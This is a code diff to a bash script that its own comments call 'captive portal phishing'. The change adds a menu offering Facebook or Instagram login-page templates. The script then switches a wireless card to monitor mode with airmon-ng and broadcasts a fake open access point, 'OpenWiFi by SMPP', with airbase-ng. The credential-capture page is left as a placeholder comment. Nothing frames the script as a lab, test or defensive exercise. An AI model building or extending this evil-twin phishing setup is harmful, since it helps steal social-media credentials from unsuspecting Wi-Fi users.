@@ -49,7 +49,7 @@ select_interface() {
     select interface in $interfaces; do
         if [ -n "$interface" ]; then
             echo "Selected interface: $interface"
-            start_captive_portal "$interface"
+            choose_template "$interface"
             break
         else
             echo "Invalid selection. Please try again."
@@ -57,15 +57,32 @@ select_interface() {
     done
 }
 
+# Function to let the user choose a template
+choose_template() {
+    echo -e "${YELLOW}Available Template Options:${NC}"
+    echo -e "${YELLOW}1. Facebook${NC}"
+    echo -e "${YELLOW}2. Instagram${NC}"
+    read -p "Choose a template option: " template_option
+
+    case $template_option in
+        1) template="facebook";;
+        2) template="instagram";;
+        *) echo "Invalid option. Please choose again."; choose_template;;
+    esac
+
+    start_captive_portal "$interface" "$template"
+}
+
 # Function to start captive portal phishing
 start_captive_portal() {
     interface=$1
+    template=$2
     echo "Starting captive portal phishing on interface: $interface"
     # Set interface to monitor mode
     airmon-ng start $interface
     # Start fake AP
     airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface
-    # Implement captive portal logic here
+    # Implement captive portal logic here, using $template variable
 }
 
 # Main script starts here
